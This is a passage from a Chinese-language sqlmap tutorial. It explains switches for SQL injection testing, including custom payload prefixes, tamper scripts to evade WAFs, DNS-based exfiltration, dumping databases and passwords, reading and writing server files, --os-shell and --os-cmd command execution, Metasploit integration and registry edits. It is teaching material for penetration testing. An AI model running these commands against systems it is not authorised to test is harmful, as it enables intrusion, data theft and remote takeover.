title="6.5 强制设置无效值替换"></a>6.5 强制设置无效值替换</h3><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用大整数值来实现相同的目标(例如id&#x3D;99999999)。 –invalid-bignum</p><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用布尔操作来实现相同的目标(例如id&#x3D;13 and18&#x3D;19)。 –invalid-logical</p><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用随机字符串来实现相同的目标(例如id&#x3D;akewmc)。 –invalid-string</p><h3 id="6-6-自定义注入负载位置"><a href="#6-6-自定义注入负载位置" class="headerlink" title="6.6 自定义注入负载位置"></a>6.6 自定义注入负载位置</h3><p>在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。 –prefix 设置SQL注入Payload前缀 –suffix 设置SQL注入Payload后缀</p><p>例如： SQL查询语句为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27; . $_GET[&#x27;id&#x27;] . &#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p>sqlmap参数使用： python sqlmap.py -u “<a href="http://ip/sqlmap/mysql/get_str_brackets.php">http://ip/sqlmap/mysql/get_str_brackets.php</a> ?id&#x3D;1” -p id –prefix “’)” –suffix “AND (‘abc’&#x3D;’abc”</p><p>插入Payload后的SQL查询语句：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;1&#x27;) &lt;PAYLOAD&gt; AND (&#x27;abc&#x27;=&#x27;abc&#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023912.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023306.png" alt="img"></p><h3 id="6-7-设置-Tamper-脚本"><a href="#6-7-设置-Tamper-脚本" class="headerlink" title="6.7 设置 Tamper 脚本"></a>6.7 设置 Tamper 脚本</h3><p>sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。</p><p>sqlmap.py -u “<a href="http://ip/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://ip/sqlmap/mysql/get_int.php?id=1”</a> –tamper“between.py,randomcase.py,space2comment.py” -v 3</p><h3 id="6-8-设置-DBMS-认证"><a href="#6-8-设置-DBMS-认证" class="headerlink" title="6.8 设置 DBMS 认证"></a>6.8 设置 DBMS 认证</h3><p>设置DBMS认证方式通过以下命令：</p><p>–dbms-cred &#x3D; username:password</p><h2 id="0x07-sqlmap-自定义检测参数"><a href="#0x07-sqlmap-自定义检测参数" class="headerlink" title="0x07 sqlmap 自定义检测参数"></a>0x07 sqlmap 自定义检测参数</h2><h3 id="7-1-设置探测等级"><a href="#7-1-设置探测等级" class="headerlink" title="7.1 设置探测等级"></a>7.1 设置探测等级</h3><p>–level 此选项需要指定要执行的测试等级的参数。有五个层次。在执行有限数量的测试(请求)时，默认值为1。1~5探测复杂逐步提升。</p><p>sqlmap使用的有效负载在文本文件xml&#x2F;payload .xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，您也应该能够添加自己的有效负载来进行测试!</p><p>这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在考试中取哪个注入点:GET和POST参数总是被测试，HTTP Cookie头值从第2级测试，HTTP用户代理&#x2F;引用头值从第3级测试。</p><p>总之，检测SQL注入越困难，必须设置的——级别就越高。 在显示无法注入时，可以设置 –level 5 来进行更强大的探测</p><h3 id="7-2-设置风险参数"><a href="#7-2-设置风险参数" class="headerlink" title="7.2 设置风险参数"></a>7.2 设置风险参数</h3><p>此选项需要指定要执行测试的风险的参数。有三个风险值。默认值为1，这对于大多数SQL注入点来说是无害的。风险值2增加了大量基于查询时间的SQL注入测试的默认级别，值3也增加了基于or的SQL注入测试。</p><p>在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的。出于这个原因和其他原因，我们引入了这个选项:用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。</p><p>例如： –risk num num范围 1~3</p><h3 id="7-3-设置页面比较参数"><a href="#7-3-设置页面比较参数" class="headerlink" title="7.3 设置页面比较参数"></a>7.3 设置页面比较参数</h3><p>默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射,例如当页面有一个计数器,一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。</p><p>–string：指定包含字符串 查询为True –not-string：指定包含字符串 查询为False –regexp：指定通过正则表达式匹配字符串,查询为True –code：指定匹配HTTP状态响应码，查询为True</p><h3 id="7-4-设置内容比较参数"><a href="#7-4-设置内容比较参数" class="headerlink" title="7.4 设置内容比较参数"></a>7.4 设置内容比较参数</h3><p>–text-only：设置页面内容中包含文本。</p><p>例如：–text-only &#x3D; “Welcome for True and Forbidden for False”</p><p>–titles：设置页面title中包含文本。前提需要知道如何区分查询的真与假，根据返回字符串内容不同。 –titles&#x3D;”Login”</p><h2 id="0x08-sqlmap-注入技术参数"><a href="#0x08-sqlmap-注入技术参数" class="headerlink" title="0x08 sqlmap 注入技术参数"></a>0x08 sqlmap 注入技术参数</h2><h3 id="8-1-设置具体-SQL-注入技术"><a href="#8-1-设置具体-SQL-注入技术" class="headerlink" title="8.1 设置具体 SQL 注入技术"></a>8.1 设置具体 SQL 注入技术</h3><p>–technique 参数用来设置具体SQL注入技术。以下列出Sqlmap支持的SQL注入技术。</p><p>B: Boolean-based blind 基于布尔的盲注 E: Error-based 报错注入 U: Union query-based Union查询注入 S: Stacked queries 堆叠注入 T: Time-based blind 基于时间的盲注 Q: Inline queries 内联查询注入</p><p>例如：sqlmap -u “存在注入点的URL” –technique B –current-db 利用基于布尔的盲注对注入点进行SQL注入探测</p><h3 id="8-2-设置时间盲注延迟时间"><a href="#8-2-设置时间盲注延迟时间" class="headerlink" title="8.2 设置时间盲注延迟时间"></a>8.2 设置时间盲注延迟时间</h3><p>在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供–time-sec选项，后面跟着一个整数。默认情况下，它的值设置为5秒。</p><p>例如： sqlmap -u “存在注入点的URL” –time-sec 3 –current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020200.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020601.png" alt="img"></p><h3 id="8-3-设置-UNION-字段数"><a href="#8-3-设置-UNION-字段数" class="headerlink" title="8.3 设置 UNION 字段数"></a>8.3 设置 UNION 字段数</h3><p>默认情况下，sqlmap测试使用1到10列的UNION查询SQL注入技术。但是，通过提供更高–level值，可以将此范围增加到50列。</p><p>您可以手动告诉sqlmap使用特定范围的列来测试这种类型的SQL注入，方法是为该工具提供选–union-cols后跟一系列整数。例如，12-16表示使用12到16个列对UNION查询SQL注入进行测试。</p><p>例如：sqlmap -u “存在注入的URL” –union-cols 12-18 –current-db</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023721.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020336.png" alt="img"></p><h3 id="8-4-设置-UNION-字符"><a href="#8-4-设置-UNION-字符" class="headerlink" title="8.4 设置 UNION 字符"></a>8.4 设置 UNION 字符</h3><p>默认情况下，sqlmap测试使用空字符的联合查询SQL注入技术。但是，通过提供更高级别的值sqlmap，还将使用随机数执行测试，因为在某些情况下，UNION查询测试使用NULL会失败，而使用随机整数则会成功。</p><p>您可以手动告诉sqlmap使用特定字符测试这种类型的SQL注入，方法是使用带有所需字符值的选项–union-char(例如–union-char 123)。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023060.png" alt="img"></p><h3 id="8-5-设置-UNION-查询表"><a href="#8-5-设置-UNION-查询表" class="headerlink" title="8.5 设置 UNION 查询表"></a>8.5 设置 UNION 查询表</h3><p>某些情况下，Sqlmap需要设定Union 查询SQL注入的具体数据表才可以得到数据。 –union-from 表名 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020332.png" alt="img"></p><h3 id="8-6-设置-DNS-露出攻击"><a href="#8-6-设置-DNS-露出攻击" class="headerlink" title="8.6 设置 DNS 露出攻击"></a>8.6 设置 DNS 露出攻击</h3><p>针对目标网络很有可能对外部流量进行限制，或者设置WAF。</p><p>通过设置DNS流量来突破限制 –dns-domain “dns服务器” 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020213.png" alt="img"></p><h3 id="8-7-设置二次注入"><a href="#8-7-设置二次注入" class="headerlink" title="8.7 设置二次注入"></a>8.7 设置二次注入</h3><p>Sqlmap中可以设置二次注入的结果页面。 –second-url URL </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020417.png" alt="img"></p><h3 id="8-8-识别指纹"><a href="#8-8-识别指纹" class="headerlink" title="8.8 识别指纹"></a>8.8 识别指纹</h3><p>–fingerprint -f 探测目标指纹信息。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023448.png" alt="img"></p><h2 id="0x09-sqlmap-检索-DBMS-信息"><a href="#0x09-sqlmap-检索-DBMS-信息" class="headerlink" title="0x09 sqlmap 检索 DBMS 信息"></a>0x09 sqlmap 检索 DBMS 信息</h2><h3 id="9-1-检索-DBMS-Banner-信息"><a href="#9-1-检索-DBMS-Banner-信息" class="headerlink" title="9.1 检索 DBMS Banner 信息"></a>9.1 检索 DBMS Banner 信息</h3><p>获取后端数据库Banner信息。 –banner或者 -b </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023235.png" alt="img"></p><h3 id="9-2-检索-DBMS-当前用户"><a href="#9-2-检索-DBMS-当前用户" class="headerlink" title="9.2 检索 DBMS 当前用户"></a>9.2 检索 DBMS 当前用户</h3><p>获取DBMS当前用户 –current-user </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020891.png" alt="img"></p><h3 id="9-3-检索-DBMS-当前数据库"><a href="#9-3-检索-DBMS-当前数据库" class="headerlink" title="9.3 检索 DBMS 当前数据库"></a>9.3 检索 DBMS 当前数据库</h3><p>获取当前数据库名。 –current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024028.png" alt="img"></p><h3 id="9-4-检索-DBMS-当前主机名"><a href="#9-4-检索-DBMS-当前主机名" class="headerlink" title="9.4 检索 DBMS 当前主机名"></a>9.4 检索 DBMS 当前主机名</h3><p>–hostname </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020400.png" alt="img"></p><h2 id="0x0A-sqlmap-枚举-DBMS-信息"><a href="#0x0A-sqlmap-枚举-DBMS-信息" class="headerlink" title="0x0A sqlmap 枚举 DBMS 信息"></a>0x0A sqlmap 枚举 DBMS 信息</h2><h3 id="10-1-探测当前用户-DBA"><a href="#10-1-探测当前用户-DBA" class="headerlink" title="10.1 探测当前用户 DBA"></a>10.1 探测当前用户 DBA</h3><p>–is-dba 探测当前用户是否是数据库管理员。</p><p>若返回True，则说明当前用户是数据库管理员 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024791.png" alt="img"></p><h3 id="10-2-枚举-DBMS-用户"><a href="#10-2-枚举-DBMS-用户" class="headerlink" title="10.2 枚举 DBMS 用户"></a>10.2 枚举 DBMS 用户</h3><p>获取DBMS所有用户 –users</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020245.png" alt="img"></p><h3 id="10-3-枚举-DBMS-用户密码"><a href="#10-3-枚举-DBMS-用户密码" class="headerlink" title="10.3 枚举 DBMS 用户密码"></a>10.3 枚举 DBMS 用户密码</h3><p>–password 获取用户密码</p><h3 id="10-4-枚举-DBMS-权限"><a href="#10-4-枚举-DBMS-权限" class="headerlink" title="10.4 枚举 DBMS 权限"></a>10.4 枚举 DBMS 权限</h3><p>–privileges –role(角色) </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024501.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024378.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020399.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020080.png" alt="img"></p><h3 id="10-5-枚举数据库名"><a href="#10-5-枚举数据库名" class="headerlink" title="10.5 枚举数据库名"></a>10.5 枚举数据库名</h3><p>–dbs 列举数据库名称 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020994.png" alt="img"></p><h3 id="10-6-枚举数据库表"><a href="#10-6-枚举数据库表" class="headerlink" title="10.6 枚举数据库表"></a>10.6 枚举数据库表</h3><p>–tables 枚举表名 –&gt; 指定具体数据库 -D 数据库名 –exclude-sysdbs 只列出用户自己新建的数据库和表 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024510.png" alt="img"></p><p> （排除DBMS系统数据库，当枚举表时）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024774.png" alt="img"></p><h3 id="10-7-枚举数据库表的列名"><a href="#10-7-枚举数据库表的列名" class="headerlink" title="10.7 枚举数据库表的列名"></a>10.7 枚举数据库表的列名</h3><p>–columns -D指定数据库 -T指定数据表 -C指定具体字段 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020147.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024183.png" alt="img"></p><h3 id="10-8-枚举数据值"><a href="#10-8-枚举数据值" class="headerlink" title="10.8 枚举数据值"></a>10.8 枚举数据值</h3><p>–dump </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020572.png" alt="img"></p><h2 id="0x0B-sqlmap-枚举信息"><a href="#0x0B-sqlmap-枚举信息" class="headerlink" title="0x0B sqlmap 枚举信息"></a>0x0B sqlmap 枚举信息</h2><h3 id="11-1-枚举-schema-信息"><a href="#11-1-枚举-schema-信息" class="headerlink" title="11.1 枚举 schema 信息"></a>11.1 枚举 schema 信息</h3><p>用户可以使用此开关–schema检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与–exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。</p><p>python sqlmap.py -u “<a href="http://192.168.48.130/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/mysql/get_int.php?id=1”</a> –schema–batch –exclude-sysdbs </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020965.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024313.png" alt="img"></p><h3 id="11-2-枚举数据表数量"><a href="#11-2-枚举数据表数量" class="headerlink" title="11.2 枚举数据表数量"></a>11.2 枚举数据表数量</h3><p>如果用户只想知道表中的条目数，则可以使用此开关。 –count</p><p>python sqlmap.py -u “<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1%E2%80%9D">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”</a> –count -D testdb</p><h3 id="11-3-获取数据信息"><a href="#11-3-获取数据信息" class="headerlink" title="11.3 获取数据信息"></a>11.3 获取数据信息</h3><p>–start, –stop, –first, –last</p><p>–start 1 –stop3 获取第二张到第三张表的名字 –stop 1 获取第一张表的名字 –first 3 –last 5 获取从第三出发到第五个字符</p><h3 id="11-4-设置条件获取信息"><a href="#11-4-设置条件获取信息" class="headerlink" title="11.4 设置条件获取信息"></a>11.4 设置条件获取信息</h3><p>–pivot-column&#x3D;id 设置独一无二的列 –where&#x3D;“id&gt;3” 设置条件 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020507.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020887.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020079.png" alt="img"></p><h3 id="11-5-暴力激活成功教程数据"><a href="#11-5-暴力激活成功教程数据" class="headerlink" title="11.5 暴力激活成功教程数据"></a>11.5 暴力激活成功教程数据</h3><p>使用场景：Mysql&lt;5.0时，Mysql中没有元数据库 information_schema。 –common-tables 暴力激活成功教程表名 –common-columns 暴力激活成功教程列名</p><h3 id="11-6-读取文件"><a href="#11-6-读取文件" class="headerlink" title="11.6 读取文件"></a>11.6 读取文件</h3><p>前提：已知目标主机文件路径 –file-read 路径 读取对应文件内容。 注意：此处路径为绝对路径。（需要使用&#x2F;&#x2F;,其中一个&#x2F;表示转义） </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024417.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024620.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024330.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024519.png" alt="img"></p><h3 id="11-7-写入文件"><a href="#11-7-写入文件" class="headerlink" title="11.7 写入文件"></a>11.7 写入文件</h3><p>–file-write 读取本地文件 –file-dest 将读取到的文件写入到远程绝对路径 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020518.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025438.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020987.png" alt="img"></p><h3 id="11-8-检索所有信息"><a href="#11-8-检索所有信息" class="headerlink" title="11.8 检索所有信息"></a>11.8 检索所有信息</h3><p>-a –all </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020256.png" alt="img"></p><h2 id="0x0C-sqlmap-系统参数"><a href="#0x0C-sqlmap-系统参数" class="headerlink" title="0x0C sqlmap 系统参数"></a>0x0C sqlmap 系统参数</h2><h3 id="12-1-执行系统命令"><a href="#12-1-执行系统命令" class="headerlink" title="12.1 执行系统命令"></a>12.1 执行系统命令</h3><p>前提条件：</p><ol><li>网站必须是root权限</li><li>攻击者需要知道网站的绝对路径</li><li>GPC为off（即magic_quotes_gpc &#x3D; off），php主动转义的功能关闭</li><li>若需要上传文件，则secure_file_priv 不为NULL</li></ol><p>–os-shell</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025967.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020059.png" alt="img"></p><h3 id="12-2-结合Metasploit"><a href="#12-2-结合Metasploit" class="headerlink" title="12.2 结合Metasploit"></a>12.2 结合Metasploit</h3><p>python sqlmap.py -u “注入点” –os-pwn –msf-path (若不使用该参数，则自动选择默认路径) （只适用于MySQL and PostgreSQL 数据库）</p><h3 id="12-3-注册表介绍"><a href="#12-3-注册表介绍" class="headerlink" title="12.3 注册表介绍"></a>12.3 注册表介绍</h3><p>注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Microsoft Windows 95操作系统开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020490.png" alt="img"></p><h3 id="12-4-注册表操作"><a href="#12-4-注册表操作" class="headerlink" title="12.4 注册表操作"></a>12.4 注册表操作</h3><p>–reg-read –reg-add –reg-del –reg-key, –reg-value, –reg-data –reg-type</p><p>例如： $ python sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> –reg-add –reg-key&#x3D;“HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</p><h2 id="0x0D-sqlmap-通用参数（一）"><a href="#0x0D-sqlmap-通用参数（一）" class="headerlink" title="0x0D sqlmap 通用参数（一）"></a>0x0D sqlmap 通用参数（一）</h2><h3 id="13-1-加载-sqlite-会话文件"><a href="#13-1-加载-sqlite-会话文件" class="headerlink" title="13.1 加载 sqlite 会话文件"></a>13.1 加载 sqlite 会话文件</h3><p>sqlmap自动为每个目标创建持久会话SQLite文件，位于专用输出目录中，其中存储会话恢复所需的所有数据。如果用户想显式地设置会话文件位置(例如在一个位置为多个目标存储会话数据)，可以使用此选项。</p><p>-s “会话文件”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025437.png" alt="img"></p><h3 id="13-2-加载-http-文本文件"><a href="#13-2-加载-http-文本文件" class="headerlink" title="13.2 加载 http 文本文件"></a>13.2 加载 http 文本文件</h3><p>这个选项需要指定文本文件的参数来写入sqlmap – HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)流量。 这主要用于调试目的——当您向开发人员提供一个潜在的bug报告时，也发送这个文件。 -t 参数 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020819.png" alt="img"></p><h3 id="13-3-设置默认选择选项"><a href="#13-3-设置默认选择选项" class="headerlink" title="13.3 设置默认选择选项"></a>13.3 设置默认选择选项</h3><p>如果希望sqlmap作为批处理工具运行，在sqlmap需要时不需要任何用户交互，那么可以使用—–batch来强制执行。这将使sqlmap在需要用户输入时保持默认行为。</p><h3 id="13-4-执行系统命令"><a href="#13-4-执行系统命令" class="headerlink" title="13.4 执行系统命令"></a>13.4 执行系统命令</h3><p>–os-cmd&#x3D;”命令” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025236.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020532.png" alt="img"></p><h3 id="13-5-设置盲注字符集"><a href="#13-5-设置盲注字符集" class="headerlink" title="13.5 设置盲注字符集"></a>13.5 设置盲注字符集</h3><p>在基于布尔和基于时间的SQL盲注中，用户可以强制使用自定义字符集来加速数据检索过程。</p><p>例如，如果转储消息摘要值(例如SHA1)，则使用–charset&#x3D;“0123456789abcdef”，预期请求数量比正常运行少30%左右 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025360.png" alt="img"></p><h3 id="13-6-爬取-URL"><a href="#13-6-爬取-URL" class="headerlink" title="13.6 爬取 URL"></a>13.6 爬取 URL</h3><p>sqlmap可以通过从目标位置开始收集链接(爬行)来收集潜在的脆弱链接。使用此选项，用户可以设置一个深度(到起始位置的距离)，低于这个深度，sqlmap不会进入收集阶段，因为只要有新的链接要访问，就会递归地执行这个过程。 –crawl python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/%E2%80%9D">http://192.168.21.128/sqlmap/mysql/”</a> –batch –crawl&#x3D;3 –crawl-exclude 字符串 存在字符串的URL不进行爬取</p><h3 id="13-7-在-CSV-输入中使用的分割字符"><a href="#13-7-在-CSV-输入中使用的分割字符" class="headerlink" title="13.7 在 CSV 输入中使用的分割字符"></a>13.7 在 CSV 输入中使用的分割字符</h3><p>当被转储的<a href="https://cloud.tencent.com/product/cos?from_column=20065&from=20065">数据存储</a>到CSV格式(–dump-format&#x3D;CSV)时，条目必须用“分离值”分隔(默认值是 ”，”)。如果用户想要覆盖它的默认值，他可以使用这个选项(例如–csv-del&#x3D;”@”)。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025576.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020699.png" alt="img"></p><h3 id="13-8-设置输出格式"><a href="#13-8-设置输出格式" class="headerlink" title="13.8 设置输出格式"></a>13.8 设置输出格式</h3><p>当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式:CSV、HTML和SQLITE。默认的是CSV，其中每个表行一行一行地存储在文本文件中，每个条目用逗号分隔(或提供了选项–csv-del)。对于HTML，输出被存储到一个HTML文件中，其中每一行都用格式化表中的一行表示。对于SQLITE，输出存储在SQLITE数据库中，原始表内容复制到同名的相应表中。</p><p>–dump-format</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020870.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025291.png" alt="img"></p><h3 id="13-9-探测之前检测-Internet-连接"><a href="#13-9-探测之前检测-Internet-连接" class="headerlink" title="13.9 探测之前检测 Internet 连接"></a>13.9 探测之前检测 Internet 连接</h3><p>在进行评估目标之前，检测当前计算机Internet连接是否正常。确保探测失败不是因为网路拦截问题。</p><p>–check-internet </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020547.png" alt="img"></p><h3 id="13-10-解析和测试表单的输入字段"><a href="#13-10-解析和测试表单的输入字段" class="headerlink" title="13.10 解析和测试表单的输入字段"></a>13.10 解析和测试表单的输入字段</h3><p>–form </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020372.png" alt="img"></p><h2 id="0x0E-sqlmap-通用参数（二）"><a href="#0x0E-sqlmap-通用参数（二）" class="headerlink" title="0x0E sqlmap 通用参数（二）"></a>0x0E sqlmap 通用参数（二）</h2><h3 id="14-1-设置预计完成时间"><a href="#14-1-设置预计完成时间" class="headerlink" title="14.1 设置预计完成时间"></a>14.1 设置预计完成时间</h3><p>可以实时地计算和显示估计的到达时间，以检索每个查询输出。当用于检索输出的技术是任何盲SQL注入类型时，就会显示这一点。 –eta </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025872.png" alt="img"></p><h3 id="14-2-刷新会话文件"><a href="#14-2-刷新会话文件" class="headerlink" title="14.2 刷新会话文件"></a>14.2 刷新会话文件</h3><p>由于会话文件的概念，所以最好知道您可以使用选项–flush-session刷新该文件的内容。通过这种方式，您可以避免sqlmap中默认实现的缓存机制。其他可能的方法是手动删除会话文件。</p><h3 id="14-3-忽略会话中的存储结果"><a href="#14-3-忽略会话中的存储结果" class="headerlink" title="14.3 忽略会话中的存储结果"></a>14.3 忽略会话中的存储结果</h3><p>使用选项–fresh-queries来忽略该文件的内容。通过这种方式，可以保持会话文件不变，对于所选的运行，避免恢复&#x2F;恢复查询输出。</p><h3 id="14-4-使用-Hex-函数检索数据"><a href="#14-4-使用-Hex-函数检索数据" class="headerlink" title="14.4 使用 Hex 函数检索数据"></a>14.4 使用 Hex 函数检索数据</h3><p>非ascii数据的检索需要特殊的需求。解决这个问题的一个方法是使用DBMS hex函数。数据在被检索之前被编码为十六进制形式，然后被未编码为原始形式。</p><p>–hex</p><p>例如： python sqlmap.py -u “<a href="http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1”</a> –hex -v 3 –batch</p><h3 id="14-5-设置自定义输出路径"><a href="#14-5-设置自定义输出路径" class="headerlink" title="14.5 设置自定义输出路径"></a>14.5 设置自定义输出路径</h3><p>sqlmap默认将会话和结果文件存储在子目录输出中。如果您想使用不同的位置，可以使用这个选项(例如–output-dir&#x3D;&#x2F;tmp)。</p><h3 id="14-6-从响应页面解析错误"><a href="#14-6-从响应页面解析错误" class="headerlink" title="14.6 从响应页面解析错误"></a>14.6 从响应页面解析错误</h3><p>如果web应用程序配置为调试模式，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们。这对于调试很有用，比如理解为什么某个枚举或接管开关不起作用——这可能与会话用户的特权有关 